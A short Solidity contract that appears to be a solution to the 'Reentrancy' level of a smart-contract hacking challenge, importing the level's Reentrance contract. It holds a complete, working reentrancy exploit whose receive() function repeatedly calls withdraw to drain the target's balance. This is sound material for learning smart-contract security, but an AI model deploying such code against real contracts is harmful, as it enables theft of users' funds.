// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../../src/levels/10-Reentrancy/Reentrance.sol";

contract ReentrancyAttack {
    Reentrance r;
    uint256 startAmount = 0.01 ether;

    constructor(address payable _target) payable {
        r = Reentrance(_target);
    }

    function startAttack() external {
        r.donate{value: startAmount}(address(this));
        r.withdraw(startAmount);
    }

    receive() external payable {
        uint256 targetContractBalance = address(r).balance;

        if (targetContractBalance != 0) {
            uint256 withdrawAmount = targetContractBalance > startAmount
                ? startAmount
                : targetContractBalance;

            r.withdraw(withdrawAmount);
        }
    }
}
